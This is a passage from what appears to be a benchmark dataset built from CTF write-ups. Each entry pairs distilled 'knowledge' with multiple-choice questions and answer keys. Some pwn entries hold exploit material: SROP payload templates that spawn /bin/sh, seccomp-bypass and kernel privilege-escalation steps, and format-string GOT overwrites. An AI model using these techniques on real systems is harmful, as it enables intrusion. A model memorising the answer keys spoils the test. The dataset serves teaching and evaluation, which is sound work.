            "When exploiting buffer overflow vulnerabilities to achieve arbitrary code execution, one strategy is to carefully craft input that overlaps a stack-buffer and overwrites program instructions or control flow data. This approach is viable when manipulating an input buffer that, if long enough, can cross into memory regions holding executable code or function return addresses. A payload can be constructed to alter intended control flow or directly introduce executable code segments into the application's memory. Implementing this requires precise calculation of buffer sizes, payload lengths, and understanding of the application's memory layout. Example payload structure for overwriting instructions: `payload = prefix + exploit_code + suffix`.",
            "In scenarios involving input handling that interprets or copies data between different memory regions (e.g., stack copying involving a buffer overlap), it is possible to utilize side effects of the copying process to inject or modify characters in the resultant data stream that would otherwise be filtered or disallowed. This particularly applies to environments where character-based filters are applied to user input before processing or evaluation. By crafting an input that, when processed or copied, results in an overlap causing part of the input to be rewritten with earlier or later portions of itself, forbidden characters or sequences can be introduced into the processed input. This approach requires an understanding of the input processing mechanism and careful calculation of buffer sizes and offsets to ensure the desired overlap occurs without causing undesirable side effects or application crashes."
        ],
        "question": [
            "In a challenge involving exploiting a buffer overflow vulnerability to execute arbitrary code, consider a scenario where an excessively long input overflows a buffer and overwrites adjacent memory, including parts of the code itself. Given the aim to use this overflow to modify the execution flow, which of the following strategies would be the most effective in constructing a payload that executes the desired commands? - A. Padding the start of the payload with NOP (No Operation) instructions to ensure the overflow reaches the return address section in memory, then appending the shellcode. - B. Ensuring the payload starts with a series of specific executable instructions intended to overwrite a function's starting address directly in the program's execution flow. - C. Filling the payload with random bytes to cause a crash, then analyzing the crash report to find useful information about memory layout. - D. Crafting the payload to include a mix of alphanumeric characters only, to bypass potential filters before overwriting return addresses. ",
            "In scenarios where input processing involves an operation that copies user-controlled data and can result in a memory region overlap (e.g., due to insufficient buffer size checks), a technique involves crafting an input that leverages this overlap to introduce or \"smuggle\" characters into the data stream that were initially filtered out or disallowed. Given this context, which among the following tactics is correct for injecting a forbidden character into the data stream through calculated buffer overlap? - A. Overfilling the buffer with a sequence of allowed characters, ensuring the tail of the sequence contains the payload intended to execute. - B. Utilizing character encoding discrepancies between the application layers to mask disallowed characters during initial filtering. - C. Creating an input pattern where the process of copying data into an overlapping memory region introduces the disallowed character into a position in the memory that bypasses prior filters. - D. Repeatedly sending variations of the disallowed character until one variation is mistakenly accepted by the input validation mechanism. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "snakemas is coming",
        "write_up": "dataset/raw/snakemas is coming.md",
        "type": "web",
        "competition": [
            "snakeCTF/2023",
            "https://ctftime.org/event/2158/tasks/"
        ],
        "score": 367,
        "max_score": 500,
        "difficulty": 0.734,
        "knowledge": [
            "When tackling challenges that involve decoded messages or hidden references, combining specific keywords from the challenge with external resources can lead to the discovery of the solution. Condition: This approach is especially useful in tasks where the challenge hints at a broader cultural, historical, or specialized knowledge base outside the typical cybersecurity domain. Knowledge: Incorporating challenge-specific keywords (\"Christmas\" in this scenario) into search queries can unveil essential information directly linked to the challenge's resolution.",
            "In challenges where initial hints or data provided (e.g., chess moves) don't directly lead to the solution, exploring the thematic or contextual hints given in the challenge description can pivot the research direction toward the correct answer. Condition: This is relevant in scenarios where the straightforward interpretation of the provided data doesn't yield the intended solution, indicating the need for a broader interpretative approach. Knowledge: Thematic elements from the challenge's narrative or title should guide additional research, possibly combining them with the initial data hints for more focused searching."
        ],
        "question": [
            "In a cybersecurity challenge where participants are provided with seemingly unrelated information, like specific keywords or phrases, what technique can be especially effective in progressing towards solving the challenge? - A. Random guessing of possible solutions without any research. - B. Ignoring the provided keywords and focusing solely on technical analysis. - C. Using the specific keywords to conduct targeted Internet searches that may reveal information closely related to the challenge's solution. - D. Asking for hints in online forums without attempting personal research.",
            "When faced with a cybersecurity challenge where the initial data provided does not directly point towards a solution, and there are thematic or contextual hints present, how should one proceed to find the correct answer? - A. Focus exclusively on the data provided and ignore any thematic or contextual clues. - B. Consider the thematic or contextual clues as distractions and not useful for solving the challenge. - C. Utilize the thematic or contextual clues to guide additional research, potentially combining them with the initial data hints for a more comprehensive search approach. - D. Assume that the initial data provided is incorrect and look for errors in the challenge itself."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Snakes and Ladders",
        "write_up": "dataset/raw/Snakes and Ladders.md",
        "type": "reverse",
        "competition": [
            "RACTF/2020",
            "https://ctftime.org/event/1051/tasks/"
        ],
        "score": 200,
        "max_score": 700,
        "difficulty": 0.2857142857142857,
        "knowledge": [
            "To reverse a ROT-N encryption, where N is the number of positions each letter has been shifted in the alphabet, decrement each character by N. If the result is before 'a', add 26 to wrap around the alphabet. This can be applied to strings where ROT-N encryption is applied to every character or selectively to characters within a specific range (e.g., 'a' to 'z'). In scenarios dealing with ROT-N ciphers, ensure proper handling of character wrapping.\n\nExample decryption routine for ROT-14 encryption:\n```python\ndef rot14_decrypt(ciphertext):\n    decrypted_text = \"\"\n    for char in ciphertext:\n        if 'a' <= char <= 'z':\n            decrypted_char = chr(ord(char) - 14)\n            if decrypted_char < 'a':\n                decrypted_char = chr(ord(decrypted_char) + 26)\n            decrypted_text += decrypted_char\n    return decrypted_text\n```",
            "To decrypt a string that has been XOR'd with a repeating key and converted to a hex string, first convert the hex string back to its original binary format using a function like `binascii.unhexlify()`. Then XOR the binary data with the same key used for encryption. This technique can reconstruct the original text if both the encryption key and the method to apply it (e.g., repeating the key for the length of the text) are known.\n\nExample decryption routine using XOR with a known repeating key:\n```python\nimport binascii\n\ndef xor_decrypt(hex_data, key):\n    binary_data = binascii.unhexlify(hex_data)\n    return ''.join(chr(b ^ ord(key[i % len(key)])) for i, b in enumerate(binary_data))\n\n# Assuming the key is \"aaaaaaaaaaaaaaa\"\nkey = \"aaaaaaaaaaaaaaa\"\nencrypted_text = \"040d161305\"  # Example encrypted hex string part\noriginal_text = xor_decrypt(encrypted_text, key)\n```"
        ],
        "question": [
            "In a coding challenge, you encounter an encryption algorithm applying a ROT-14 cipher selectively to lowercase characters between 'a' and 'z' in a given string. To decrypt a string encrypted using this method, which option correctly implements the decryption process? - A. Add 14 to the character's ASCII code and subtract 26 if the result exceeds 'z'. - B. Subtract 14 from the character's ASCII code and add 26 if the result is less than 'a'. - C. Subtract 14 from the character's ASCII code and subtract 26 if the result is less than 'z'. - D. Add 14 to the character's ASCII code and add 26 if the result exceeds 'z'. ",
            "During a reversing challenge, you need to decrypt a string that was encrypted by XOR'ing it with a repeating key \"aaaaaaaaaaaaaaa\" and then converting it to a hexadecimal string. Which option correctly describes the decryption process of converting the hex string back to the original text? - A. The XOR operation should be applied directly to the hex string without converting it back from hex. - B. Convert the hex string to binary, then apply the XOR operation with a different key. - C. Convert the hex string back to binary using `binascii.unhexlify()` and XOR with the original repeating key. - D. Use a shifting mechanism instead of XOR to decrypt the hex string. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "sockcamp",
        "write_up": "dataset/raw/sockcamp.md",
        "type": "pwn",
        "competition": [
            "CircleCityCon/2021",
            "https://ctftime.org/event/1350/tasks/"
        ],
        "score": 299,
        "max_score": 299,
        "difficulty": 1.0,
        "knowledge": [
            "When a syscall is blocked by seccomp, privilege escalation can still be performed by flipping a bit in the `current->task_struct` to disable seccomp. This requires finding the correct offset and bit to modify. A single bit flip can disable the seccomp restrictions entirely for the current process. Example manipulation to disable seccomp would closely follow the conceptual approach rather than a direct code snippet, involving targeting the `thread_info.flags` field to unset the `_TIF_SECCOMP` bit, effectively turning off seccomp for the process context.",
            "To perform privilege escalation in a restricted environment where direct execution of critical functions like `commit_creds(prepare_kernel_cred(0))` is not possible due to seccomp filtering or other restrictions, leverage an allowed custom syscall that executes arbitrary code supplied by the user. By constructing a payload that calls critical kernel functions to escalate privileges and injecting this payload through the allowed custom syscall, one can elevate the process's privileges to root. In scenarios where KASLR (Kernel Address Space Layout Randomization) is disabled, fixed addresses can be used directly in the payload. Example payload for escalating privileges could be an assembly snippet that when executed, invokes `commit_creds(prepare_kernel_cred(0))` directly, as shown in the C array `escalate_privs` in the write-up."
        ],
        "question": [
            "In a kernel challenge where a custom syscall is defined to modify the properties of the current executing process (`current`), if you aim to disable seccomp by flipping a specific bit in the `current->task_struct`, what is the proper approach? - A. Increase the process's priority using `setpriority()` syscall before flipping the bit to ensure successful modification. - B. Identifying the correct offset and bit within `current->task_struct` to unset the `_TIF_SECCOMP` flag, effectively disabling seccomp for the process. - C. Modify the syscall table to redirect all syscalls to a custom handler that ignores seccomp rules. - D. Write a kernel module that patches the `current->task_struct` to ignore seccomp rules upon loading.",
            "When attempting privilege escalation via a custom syscall that is allowed to execute arbitrary user-supplied code in a kernel challenge, how can you elevate the process's privileges to root without directly calling restricted functions like `commit_creds()` or `prepare_kernel_cred()`? - A. By writing directly to the `/proc/self/mem` file to replace the current process's code with root-privilege-executing code. - B. Sending a special signal to the kernel that triggers an undocumented privilege escalation mechanism. - C. Utilizing a custom syscall to inject and execute a crafted payload that invokes `commit_creds(prepare_kernel_cred(0))` indirectly, bypassing restrictions. - D. Creating a user-mode thread that shares the same memory space with kernel threads, allowing direct access to kernel functions without restrictions."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Some Really Ordinary Program",
        "write_up": "dataset/raw/Some Really Ordinary Program.md",
        "type": "pwn",
        "competition": [
            "NahamCon/2021",
            "https://ctftime.org/event/1281/tasks/"
        ],
        "score": 492,
        "max_score": 500,
        "difficulty": 0.984,
        "knowledge": [
            "When exploiting a binary with limited gadgets, and NX (No eXecute) and ASLR (Address Space Layout Randomization) protections enabled, leveraging a sigreturn-oriented programming (SROP) attack can be effective. This involves constructing a sigreturn frame in the stack, which can then be used to control the execution flow by setting up the registers for a subsequent syscall. This technique is particularly useful when direct execution of shellcode is prevented by security mechanisms. Condition: This approach is applicable when you have control over the stack and can manipulate the stack to point to a syscall gadget, and the binary has sigreturn syscall available.\n\nExample payload construction using pwntools for SROP attack:\n```python\nfrom pwn import *\ncontext.arch = 'amd64'  # Set this according to the binary's architecture\n\n# Construct the SigreturnFrame\nframe = SigreturnFrame(kernel='amd64')\nframe.rip = syscall_address  # Address of the syscall; gadget found in the binary\nframe.rdi = value_for_rdi  # Set registers as required for the next syscall\nframe.rsi = value_for_rsi\nframe.rdx = value_for_rdx\nframe.rax = syscall_number  # Syscall number for the desired syscall\n\n# Construct the payload\npayload = b'A'*offset  # Offset to the return address\npayload += p64(ret_to_syscall_gadget_address)  # Address of gadget to return to\npayload += bytes(frame)  # Append the sigreturn frame to the payload\n```",
            "To bypass NX protection and execute a shell when arbitrary write operations are possible but direct execution is not, one can write the \"/bin/sh\" string to a writable segment of the binary (e.g., .data or .bss sections) and then use a `sigreturn` frame to set up and invoke an `execve(\"/bin/sh\", 0, 0)` syscall. This method is efficient when the binary has writable segments with predictable addresses (i.e., when PIE - Position Independent Executable - is disabled) and the ability to control the input to make syscalls indirectly. Condition: Suitable when you have arbitary write and can control the execution flow to trigger a `sigreturn` syscall.\n\nExample payload for triggering `execve` via SROP:\n```python\nframe = SigreturnFrame(kernel='amd64')\nframe.rip = syscall_address  # Address of the syscall; gadget\nframe.rdi = address_of_bin_sh_string  # Address of \"/bin/sh\" string written into memory\nframe.rsi = 0  # NULL\nframe.rdx = 0  # NULL\nframe.rax = constants.SYS_execve  # Syscall number for execve\n\n# Preparing payload to trigger the sigreturn and execute the execve syscall\npayload = b'A'*offset  # Offset to control EIP/RIP\npayload += p64(gadget_to_trigger_sigreturn)  # Gadget to trigger sigreturn\npayload += bytes(frame)  # Append the sigreturn frame to the payload\n```"
        ],
        "question": [
            "In an environment where both NX and ASLR protections are enabled, and direct execution of shellcode is not possible, which of the following approaches is viable for exploiting a binary that has limited gadgets available?  - A. Writing shellcode directly to the executable segment of the binary and executing it. - B. Leveraging a sigreturn-oriented programming (SROP) attack by constructing a sigreturn frame to control the execution flow. - C. Overwriting the Global Offset Table (GOT) to redirect execution to a libc function without controlling the stack. - D. Disabling ASLR by overwriting memory address values stored in the binary. ",
            "When attempting to bypass NX protection in a binary that allows for arbitrary writes but direct execution is prohibited, which approach can be utilized to execute a shell after writing the \"/bin/sh\" string into a writable (and executable) segment?  - A. Directly invoking a 'jmp rsp' instruction to jump to an injected shellcode on the stack. - B. Utilizing a format string vulnerability to overwrite the return address with the location of \"/bin/sh\". - C. Constructing and triggering a `sigreturn` syscall to setup and execute an `execve(\"/bin/sh\", 0, 0)` syscall. - D. Creating a NOP sled that leads to the injected shellcode in the binary's data segment. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Sophie Wilson",
        "write_up": "dataset/raw/Sophie Wilson.md",
        "type": "crypto",
        "competition": [
            "CyberHeroines/2023",
            "https://ctftime.org/event/2054/tasks/"
        ],
        "score": 200,
        "max_score": 400,
        "difficulty": 0.5,
        "knowledge": [
            "In RSA challenges where the public exponent \\(e\\) is small and ciphertext \\(c\\) is given, it's possible to decrypt \\(c\\) directly by computing the \\(e\\)th root of \\(c\\) without needing the private key. This is effective when the message \\(m\\) is small enough that \\(m^e < n\\), ensuring that \\((c = m^e \\mod n) = m^e\\) directly.\n   - Example Python snippet to compute the \\(e\\)th root of \\(c\\):\n     ```python\n     from gmpy2 import iroot\n     c = 268593521627440355433888284074970889184087304017829415653214811933857946727694253029979429970950656279149253529187901591829277689165827531120813402199222392031974802458605195286640398523506218117737453271031755512785665400604866722911900724895012035864819085755503886111445816515363877649988898269507252859237015154889693222457900543963979126889264480746852695168237115525211083264827612117674145414459016059712297731655462334276493\n     e = 5\n     ith_root = iroot(c, e)[0]\n     ```",
            "After obtaining the plaintext message in integer form, convert it to bytes and then decode it to retrieve the flag or textual content. This decoding step is essential for CTF challenges where the plaintext is expected to be human-readable.\n   - Example Python code for conversion and decoding:\n     ```python\n     from Crypto.Util.number import long_to_bytes\n     # Assuming ith_root is the integer form of the plaintext\n     pt_bytes = long_to_bytes(ith_root)  # Convert integer to bytes\n     plaintext = pt_bytes.decode()  # Decode bytes to string (if applicable)\n     print(\"Plaintext: \", plaintext)\n     ```"
        ],
        "question": [
            "In a scenario involving RSA encryption where the public exponent \\(e\\) is notably small, and you are provided with the ciphertext \\(c\\), a direct decryption approach can be applied by computing the \\(e\\)th root of \\(c\\). This technique bypasses the need for the private decryption key. Given the values for \\(e\\) and \\(c\\), which python library function would be appropriately used to calculate the \\(e\\)th root of \\(c\\) to retrieve the original plaintext message? - A. `sqrt(c, e)` from the `math` library. - B. `iroot(c, e)[0]` from the `gmpy2` library. - C. `pow(c, 1/e)` in native Python. - D. `root(c, e)` from the `numpy` library.",
            "Converting the obtained integer plaintext message back into human-readable text is an essential step after solving an RSA challenge, especially when extracting flags in CTF competitions. Assuming you have the integer value of the plaintext, which sequence of python functions correctly converts this integer back into a readable string? - A. `str.decode(ith_root)` directly. - B. `int.to_string(ith_root)` using native Python. - C. `ith_root.decode('utf-8')` assuming `ith_root` is a byte string. - D. `long_to_bytes(ith_root).decode()` using the `Crypto.Util.number` module."
        ],
        "answer": [
            "B.",
            "D."
        ]
    },
    {
        "name": "Sora 398",
        "write_up": "dataset/raw/Sora 398.md",
        "type": "reverse",
        "competition": [
            "AUCTF/2020",
            "https://ctftime.org/event/1020/tasks/"
        ],
        "score": -1,
        "max_score": 1000,
        "difficulty": -1,
        "knowledge": [
            "When facing a challenge involving custom encryption or encoding algorithms, the decryption process can often be reverse-engineered by analyzing the encryption logic provided in the binary or script. This involves iterating through potential plaintext values to find a match for each encrypted character, assuming the encryption process operates on a character-by-character basis. \n   - Example methodology: For an encryption function that transforms each character of the plaintext using specific arithmetic operations, reverse the operations while iterating through possible plaintext character values until the transformed value matches the encrypted output.\n   - Sample code snippet:\n     ```python\n     encrypted = b\"aQLpavpKQcCVpfcg\"\n     decrypted = []\n     for i in range(len(encrypted)):\n         for c in range(65, 122):  # ASCII range for uppercase letters and lowercase letters\n             if (c * 8 + 0x13) % 0x3d + 0x41 == encrypted[i]:\n                 decrypted.append(c)\n                 break\n     print(\"Decrypted key: \" + \"\".join([chr(c) for c in decrypted]))\n     ```",
            "Debugging and decompiling tools such as Ghidra are invaluable for understanding the functionality of binary files in CTF challenges. These tools allow participants to view higher-level code representations of the program's logic, making it possible to identify encryption algorithms, hardcoded keys, or specific conditions needed to alter program flow or output successfully.\n   - Condition: This approach is particularly suitable for reverse engineering challenges where the source code is not available, and the only interaction possible is with the binary executable or when analyzing malware samples.\n   - Example methodology: After decompiling the binary, carefully review the logic related to input processing, searching for any functions that transform the input or compare it against a specific value. These insights can then guide the development of scripts or payloads to manipulate the program's execution or reveal hidden information."
        ],
        "question": [
            "In a challenge that involves reversing a custom encryption algorithm where each character of a secret key is encrypted through a specific arithmetic operation, how can the decryption algorithm be correctly reverse-engineered to uncover the original key?  - A. Execute a brute force attack using all ASCII characters for each encrypted character until finding a direct match without any operations. - B. Reverse the arithmetic operations applied during the encryption process and apply them directly to the encrypted key to obtain the original characters. - C. **Iterate through a range of potential character values, applying the reverse of the given encryption logic to each, until finding a match with the encrypted characters.** - D. Use a standard decryption tool with default settings to automatically decrypt the encrypted key without analyzing the encryption logic. ",
            "When dealing with a binary file in a CTF challenge without access to the source code, which tool and approach are best suited to understand and analyze the program's logic for vulnerabilities or specific functionalities like custom encryption algorithms?  - A. Use a simple text editor to view the binary content directly and guess the program's functionality based on visible strings and patterns. - B. **Leverage debugging and decompiling tools, such as Ghidra, to view a higher-level representation of the code and analyze the program's logic for reverse engineering tasks.** - C. Immediately run the binary with random inputs to observe its behavior and output, relying on trial and error to understand its functionality. - D. Deploy automatic code-guessing algorithms that generate a potential source code without any manual analysis or understanding of the binary structure. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Sound Maze 2",
        "write_up": "dataset/raw/Sound Maze 2.0.md",
        "type": "pwn",
        "competition": [
            "Pwn2Win/2020",
            "https://ctftime.org/event/961/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When exploring an unknown digital environment where direct visual or textual feedback is not available, such as mazes or puzzles dealing with audio cues, applying depth-first search (DFS) for exploration and mapping can be effective. Use audio or any non-visual cues to determine the state of each node or position (e.g., empty, wall, bomb, end) and construct a representation of the environment. Employ a custom class or data structure to store the environment's layout and state, marking visited positions and obstacles appropriately.",
            "For finding the shortest path in a non-weighted graph, like the mapped maze from an exploration phase, implement a breadth-first search (BFS) algorithm after the exploration is complete. This algorithm efficiently computes the shortest path by traversing the graph level by level. Ensure to initialize all distances as infinity (or a sufficiently large number) except for the starting point, and update distances and paths as the exploration proceeds. Utilize a queue to keep track of the order in which nodes are visited, ensuring a systematic exploration from the nearest to the farthest nodes."
        ],
        "question": [
            "In a scenario where one needs to explore and map an unknown environment communicated only through audio cues, indicating states such as empty spaces, walls, bombs, or the endpoint, which algorithm is most suitable for initial exploration and mapping? - A. Breadth-first search (BFS) - B. Depth-first search (DFS) - C. Dijkstra's algorithm - D. A* algorithm",
            "After completely mapping an environment such as a maze using audio cues for navigation without visual aids, you need to determine the shortest path from the start to the endpoint. Considering the map represents a non-weighted graph, which algorithm would be most efficient for finding this shortest path? - A. Dijkstra's algorithm - B. Breadth-first search (BFS) - C. Bellman-Ford algorithm - D. Depth-first search (DFS)"
        ],
        "answer": [
            "B",
            "B"
        ]
    },
    {
        "name": "so_much",
        "write_up": "dataset/raw/so_much.md",
        "type": "reverse",
        "competition": [
            "DarkCTF/2020",
            "https://ctftime.org/event/1118/tasks/"
        ],
        "score": 207,
        "max_score": 499,
        "difficulty": 0.4148296593186373,
        "knowledge": [
            "When dealing with challenges involving string comparison functions like `strcmp`, it's a practical approach to use a debugger, such as GDB, to set breakpoints around these functions. By examining the contents of relevant registers (such as `rsi` and `rdi` in x86-64 architecture) right before the `strcmp` call, one can identify the arguments being compared. This method is particularly useful for identifying hardcoded strings or flag values being compared to user input.",
            "In challenges where the source code is not available, and the binary is expected to process command-line arguments or input that includes potential flag formats or specific keywords, running the binary with such inputs and observing its behavior or output can hint at its internal processing logic. This approach can help narrow down the investigation areas when preparing for a debugging session, especially in binaries that exhibit complex behaviors or involve numerous function calls."
        ],
        "question": [
            "In a challenge involving identifying a hidden string through reverse engineering, you decide to use a debugger tool, such as GDB, to inspect the binary's behavior during string comparison operations. Which of the following steps would be most effective for revealing the string being compared using the `strcmp` function in an x86-64 binary application? - A. Insert breakpoints on arithmetic operations and monitor the stack pointer. - B. Set a breakpoint at `strcmp` and check the values in the `rsi` and `rdi` registers for the strings being compared. - C. Monitor the application's network traffic to capture the comparison. - D. Change all instances of `strcmp` to `strncmp` in the binary to observe differences in behavior. ",
            "When analyzing a binary executable that does not provide its source code, which technique is particularly helpful for deducing how the program processes its command-line arguments or input, especially when looking for a specific input pattern or flag format? - A. Reverse engineering the executable to directly modify its entry point. - B. Decompiling the binary and rewriting sections of its logic in a higher-level language. - C. Running the binary with a variety of inputs, including potential flag formats or keywords, to observe any unique or revealing outputs or behaviors. - D. Encrypting all strings within the binary and monitoring for decryption routines. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "space stream",
        "write_up": "dataset/raw/space stream.md",
        "type": "The type of challenge presented in this write-up is **forensics**.",
        "competition": [
            "SpaceHeroes/2023",
            "https://ctftime.org/event/1856/tasks/"
        ],
        "score": 473,
        "max_score": 1000,
        "difficulty": 0.473,
        "knowledge": [
            "When working with a virtual disk file (VHD) in a CTF challenge and the data may not be intact, tools such as `testdisk` for Linux or `Autopsy` for Windows can be utilized to recover missing files. To use `testdisk`, you can initiate it with the command `testdisk startstream.vhd`, follow the prompts to select the disk, and use the quick search option to scan for recoverable files. Post-scan, you can list and select all files for extraction with the combination `Shift + P` to list files, use `a` to select all, and `Shift + C` to commence copying the selected files to a specified location.",
            "In a scenario where you uncover a password-protected file (e.g., a PDF) during your examination of data recovered from a virtual disk, it's possible that other extracted files could contain hints for the password. For instance, if text files are extracted alongside images (such as `stream1.jpg:sarah_kerrigan`), these might contain usable information, like a user name or other identifiable strings, which could potentially be the password for the encrypted file. Once the possible password is identified (e.g., `sarah_kerrigan`), it can be tried on the password-protected file to gain access and retrieve the flag or other critical information."
        ],
        "question": [
            "When attempting to recover files from a corrupted or tampered virtual disk file using `testdisk` on a Linux system, which of the following sequences correctly represents the steps to perform a quick search and extract files? - A. Run `testdisk startstream.vhd`, select the disk, choose partition table type, use the deep search option, and press `a` to extract files. - B. Execute `testdisk`, manually input the filesystem type, select deep scan, press `Shift + P` to preview files, and `Ctrl + A` to archive them. - C. Initiate `testdisk startstream.vhd`, follow prompts to select disk and partition table type, perform a quick search with `Enter`, list files with `Shift + P`, select all with `a`, and copy with `Shift + C`. - D. Start `testdisk`, choose the disk, ignore partition detection, directly access file preview with `P`, manually select each file, and copy to a new location. ",
            "In a digital forensic task where you find a password-protected PDF within recovered files from a virtual disk, and hints for the password could be embedded in associated text files named after images, what approach should be taken to attempt unlocking the PDF? - A. Assume no relation between text files and the PDF password, and attempt brute-force cracking techniques on the PDF only. - B. Open each text file, look for patterns or strings matching user behaviors or names, and then try these as passwords on the PDF. - C. Ignore the text files as misleading artifacts and focus on decrypting the PDF through vulnerability exploitation. - D. Rename the password-protected PDF to match the text file names in hopes the password protection will automatically decrypt. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Space!",
        "write_up": "dataset/raw/Space!.md",
        "type": "crypto",
        "competition": [
            "IJCTF/2020",
            "https://ctftime.org/event/1003/tasks/"
        ],
        "score": 100,
        "max_score": 1000,
        "difficulty": 0.1,
        "knowledge": [
            "When faced with a situation where direct brute-forcing of AES keys is impractical due to high entropy, but the keys have low entropy portions (e.g., only 2 bytes of meaningful data), employing a meet-in-the-middle attack can significantly reduce the complexity. Here, the process involves encrypting a known plaintext with all possible keys for half the number of encryption rounds and storing these results. Then, decrypting the ciphertext with all possible keys for the remaining rounds and looking for matches in the previously stored results. This approach can effectively reveal the encryption keys with considerably lower computational effort than brute-forcing all possible keys for the entire sequence.\n\n    - **Condition**: Works efficiently when the keys used in AES encryption have low entropy sections, and the encryption process is sequentially layered, allowing for a meet-in-the-middle strategy.\n    - **Knowledge Detail**: Implement a meet-in-the-middle attack by splitting the encryption process into two halves. First, generate a map of 2-round encrypted known plaintext to their corresponding keys. Then, decrypt the given ciphertext for 2 rounds with all possible keys and match against the stored results to find the full key sequence.",
            "Parallelization can drastically speed up the process of cryptographic brute-forcing or meet-in-the-middle attacks where computational tasks are independent and can be distributed across multiple processors. Utilizing multiple cores to run parallel instances of encryption or decryption workloads allows for the exploration of key spaces or match searching to occur in a fraction of the time it would take sequentially. This method is crucial for time-efficiently solving cryptographic challenges with high computational demands.\n\n    - **Condition**: Effective when the cryptographic challenge involves computationally intensive tasks that can be parallelized, such as generating key maps or brute-forcing keys in segments.\n    - **Knowledge Detail**: Utilize parallel processing to accelerate the meet-in-the-middle strategy by distributing the encryption and decryption tasks across several processes. The technique involves generating encryption mappings and decryption mappings concurrently, significantly reducing overall computation time. Implement parallel processing in Python using libraries or constructs that support multiprocessing, such as the `multiprocessing` module, to distribute workloads effectively across multiple CPU cores."
        ],
        "question": [
            "In the context of an AES encryption scenario where the encryption key has only 2 bytes of meaningful data, and you are given a known plaintext-ciphertext pair along with a known IV, which approach would efficiently reduce the computational effort to find the encryption keys? - A. Use a side-channel attack to infer the key based on execution time. - B. Implement a meet-in-the-middle attack by encrypting the plaintext for half the rounds with all possible keys, storing the results, and then decrypting the ciphertext for the remaining rounds with possible keys to find matches. - C. Attempt a rainbow table attack to find the encryption key directly. - D. Directly brute-force all possible keys for the entire key space.",
            "When facing a cryptographic challenge where you need to perform a large number of encryption or decryption operations to solve for keys, and each operation is independent of the others, how can you significantly speed up the process? - A. Use a genetic algorithm to guess the keys more intelligently. - B. Encrypt and decrypt data serially on a single processor to maintain order. - C. Utilize parallel processing by distributing the encryption and decryption tasks across multiple CPU cores, executing workloads concurrently. - D. Reduce the complexity of cryptographic algorithms to decrease processing time."
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "Speed-Rev_ Humans",
        "write_up": "dataset/raw/Speed-Rev_ Humans.md",
        "type": "reverse",
        "competition": [
            "HackPack/2023",
            "https://ctftime.org/event/1893/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When solving reverse engineering challenges that involve understanding and manipulating binary constraints, the Z3 Solver library can be a powerful tool for resolving Satisfiability Modulo Theories (SMT) problems. The library can be used to define variables and constraints programmatically, allowing for automated finding of input values that satisfy all given conditions to extract flags or required outputs.",
            "In reversing tasks where a solution involves determining specific character values (e.g., alphanumeric or special characters) to satisfy a set of conditions, applying additional constraints on input values to match the expected character ranges (such as lowercase letters, uppercase letters, and numbers) can significantly reduce the search space and expedite finding a correct solution. This approach is particularly effective when dealing with binary constraints that do not entirely reveal the expected character set, enabling a focused search within a defined character range.\n\nExample payload for constructing and solving a constraint problem:\n```python\nfrom z3 import *\n\ns = Solver()\n\n# Define variables\nparam = [BitVec('param_%d' % i, 8) for i in range(length)]\n\n# Example for adding binary constraints\ns.add(param[0] + param[1] == 0x8c)  # Adding a constraint\n\n# Example for adding character range constraints\nfor i in range(length):\n    s.add(Or(And(param[i] >= 48, param[i] <= 57),    # digits\n             And(param[i] >= 65, param[i] <= 90),    # uppercase A-Z\n             And(param[i] >= 97, param[i] <= 122)))  # lowercase a-z\n\n# Check and print solution\nif s.check() == sat:\n    m = s.model()\n    solution = ''.join([chr(m[param[i]].as_long()) for i in range(length)])\n    print(solution)\nelse:\n    print(\"No solution\")\n```\nThis sample outlines constructing a simple constraint problem, adding binary constraints specific to the challenge, narrowing down possible values with character range limits, and finally checking for a satisfactory solution."
        ],
        "question": [
            "Which of the following is the correct way to define variable constraints using the Z3 Python library for solving a set of linear equations derived from a reverse engineering challenge?  - A. Use the `Constraint()` method to directly add linear equations to the Z3 solver. - B. Utilize the `BitVec()` function to create variable representations and the `s.add()` method to apply the constraints. - C. Implement the `LinearEquation()` class for each variable and equation before solving. - D. Call the `DefineVar()` function with equation parameters to automatically solve them without adding constraints. ",
            "When imposing character range restrictions on variables in the context of solving a binary constraint problem, which approach is effective for restricting search space to alphanumeric characters using the Z3 library?  - A. Apply the `restrict()` method to each variable with parameters specifying the ascii values for alphanumeric characters. - B. Use the `SetRange()` function with global settings for character types allowed in the solution. - C. Create a separate constraint for each variable that specifies it must be within the numeric ranges corresponding to digits, uppercase, and lowercase letters. - D. Implement a filtering loop outside the Z3 solver that checks the validity of each solution against character codes for alphanumeric values. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "speedrun 00-17",
        "write_up": "dataset/raw/speedrun 00-17.md",
        "type": "crypto",
        "competition": [
            "Sunshine/2020",
            "https://ctftime.org/event/992/tasks/"
        ],
        "score": -1,
        "max_score": 700,
        "difficulty": -1,
        "knowledge": [
            "When a binary contains a format string vulnerability due to a `printf` function lacking a proper format string (e.g., `printf(buffer);`), it can be exploited to achieve a write-what-where condition. This can be utilised to modify the Global Offset Table (GOT) entries for code redirection. To exploit this vulnerability, one can use a tool like `fmtstr_payload` from pwntools to generate a payload that overwrites a GOT entry with the address of a desired function, such as `system`.",
            "In challenges where the executable uses `rand()` seeded with the current time (e.g., `srand(time(NULL)); rand();`), the output of `rand()` can be predicted if the execution time of the program is known. This is because `rand()` is deterministic, and seeding it with the current time means that the sequence of random numbers it produces can be reproduced if the seed (time) is known. To exploit this, one can write a script (in C, Python with ctypes, etc.) that seeds `rand()` with the current UTC time and then calls `rand()` to predict the value the challenge program will generate. This approach is particularly effective if the server's and attacker's times are synchronized or if the time can be precisely guessed."
        ],
        "question": [
